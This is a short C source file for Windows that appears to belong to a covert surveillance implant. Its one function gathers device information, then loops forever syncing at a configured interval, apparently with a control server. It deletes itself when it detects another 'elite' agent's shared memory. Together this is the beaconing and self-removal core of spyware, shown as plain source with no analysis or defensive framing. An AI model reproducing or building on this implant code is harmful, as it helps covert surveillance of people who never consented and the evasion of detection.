#include <Windows.h>

#include "globals.h"
#include "binpatch.h"
#include "utils.h"
#include "mayhem.h"
#include "debug.h"
#include "social.h"
#include "proto.h"
#include "device.h"
#include "conf.h"

VOID SyncThreadFunction()
{
	GetDeviceInfo();

	while (1)
	{
		if (ExistsEliteSharedMemory())
			DeleteAndDie(TRUE);
		

		BOOL bLastSync = Synch();
		MySleep(ConfGetRepeat(L"sync"));  //FIXME: array
	}
}
